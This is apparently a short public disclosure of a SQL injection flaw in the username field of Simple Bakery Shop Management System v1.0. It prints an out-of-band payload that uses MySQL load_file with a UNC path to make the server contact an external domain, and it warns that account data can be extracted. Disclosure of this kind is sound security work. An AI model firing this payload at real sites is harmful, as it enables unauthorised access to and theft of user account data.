## Title: Simple Bakery Shop Management System v1.0 remote SQL-Injections
## Author: nu11secur1ty
## Vendor: https://www.sourcecodester.com/users/tips23
## Software: https://www.sourcecodester.com/php/15174/simple-bakery-shop-management-system-phpoop-free-source-code.html


## Description:
The username parameter from Simple Bakery Shop Management System v1.0
appears to be vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\uecbuk5uwc33xkpj8ty1fdix5obhz9n0qoib8zx.https://www.sourcecodester.com/php/15174/simple-bakery-shop-management-system-phpoop-free-source-code.html\\zgr'))+'
was submitted in the username parameter.
This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed. The attacker can be retrieving all
information about all
accounts of this system. The malicious actor can use this information
for malicious purposes!
WARNING: If this is in some external domain, or some subdomain, or
internal, this will be extremely dangerous!
Status: CRITICAL
